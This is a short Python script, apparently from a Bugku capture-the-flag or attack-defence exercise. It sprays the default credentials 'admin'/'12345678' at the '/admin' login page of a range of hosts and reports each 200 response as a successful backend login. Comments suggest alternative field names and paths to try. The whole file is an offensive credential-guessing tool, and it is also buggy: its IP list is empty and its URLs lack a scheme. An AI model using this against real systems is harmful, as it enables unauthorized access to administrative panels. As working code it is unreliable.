import requests

headers = {
"Cache-Control": "max-age=0",
"Upgrade-Insecure-Requests":'1',
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"Connection": "keep-alive",
"Accept-Encoding": "gzip, deflate"
}

ip = []
url='192-168-1-{}.pvp1813.bugku.cn'
login = 'admin'
# admin, login
url = url+'/'+login
port='80'
payload={
    "username":"admin",
    # usr, username, email, user
    "password":"12345678"
    # password, pass, passwd
}

for i in ip:
    url1=url.format(str(i))
    try:
        response=requests.post(url1, payload, headers=headers)
        if response.status_code == 200:
            response.encoding=response.apparent_encoding
            print("[+] 登入{}的后台".format(url1))
    except:
        pass 
